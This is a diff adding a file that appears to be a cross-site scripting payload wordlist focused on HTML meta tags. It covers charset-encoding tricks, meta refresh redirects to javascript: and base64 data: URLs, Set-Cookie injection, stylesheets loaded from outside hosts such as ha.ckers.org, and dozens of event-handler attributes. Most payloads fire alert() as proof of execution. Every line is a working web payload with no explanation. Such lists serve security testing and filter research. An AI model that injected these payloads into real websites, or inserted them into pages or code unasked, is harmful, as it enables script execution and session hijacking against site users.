@@ -1,0 +1,97 @@
+<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+<meta charset="mac-farsi">¼script¾javascript:alert(1566)¼/script¾
+<meta charset="mac-farsi">¼script¾javascript:alert(652)¼/script¾
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1613)&&;&&<&&/script&&>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(699)&&;&&<&&/script&&>
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta content="&NewLine; 1149 &NewLine;; JAVASCRIPT&colon; alert(1149)" http-equiv="refresh"/>
+<meta content="&NewLine; 1686 &NewLine;; JAVASCRIPT&colon; alert(1686)" http-equiv="refresh"/>
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<meta content="&NewLine; 772 &NewLine;; JAVASCRIPT&colon; alert(772)" http-equiv="refresh"/>
+<meta content="&NewLine; 811 &NewLine;; JAVASCRIPT&colon; alert(811)" http-equiv="refresh"/>
+<meta draggable="true" ondrag="alert(1)">test</meta>
+<meta draggable="true" ondragend="alert(1)">test</meta>
+<meta draggable="true" ondragenter="alert(1)">test</meta>
+<meta draggable="true" ondragleave="alert(1)">test</meta>
+<meta draggable="true" ondragstart="alert(1)">test</meta>
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1166)"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1701)"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(789)"/>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(828)"/>
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1036);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1670);">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert(1747);\">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(1893);";>;
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(756);">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1593);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(679);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1035);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1669);">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1746);\">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(1892);";>;
+<META. HTTP-EQUIV="refresh"CONTENT="0;url=javascript.:alert(253);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(755);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(946);">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1592);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(678);">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1048)</SCRIPT>">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1681)</SCRIPT>">
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(1906)<;/SCRIPT>;";>;
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(767)</SCRIPT>">
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
+<meta id=x tabindex=1 onactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
+<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
+<meta id=x tabindex=1 onfocus=alert(1)></meta>
+<meta id=x tabindex=1 onfocusin=alert(1)></meta>
+<meta onbeforecopy="alert(1)" contenteditable>test</meta>
+<meta onbeforecut="alert(1)" contenteditable>test</meta>
+<meta onbeforepaste="alert(1)" contenteditable>test</meta>
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onclick="alert(1)">test</meta>
+<meta oncontextmenu="alert(1)">test</meta>
+<meta oncopy="alert(1)" contenteditable>test</meta>
+<meta oncut="alert(1)" contenteditable>test</meta>
+<meta ondblclick="alert(1)">test</meta>
+<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onkeydown="alert(1)" contenteditable>test</meta>
+<meta onkeypress="alert(1)" contenteditable>test</meta>
+<meta onkeyup="alert(1)" contenteditable>test</meta>
+<meta onmousedown="alert(1)">test</meta>
+<meta onmouseenter="alert(1)">test</meta>
+<meta onmouseleave="alert(1)">test</meta>
+<meta onmousemove="alert(1)">test</meta>
+<meta onmouseout="alert(1)">test</meta>
+<meta onmouseover="alert(1)">test</meta>
+<meta onmouseup="alert(1)">test</meta>
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1131)";
+<meta onpaste="alert(1)" contenteditable>test</meta>
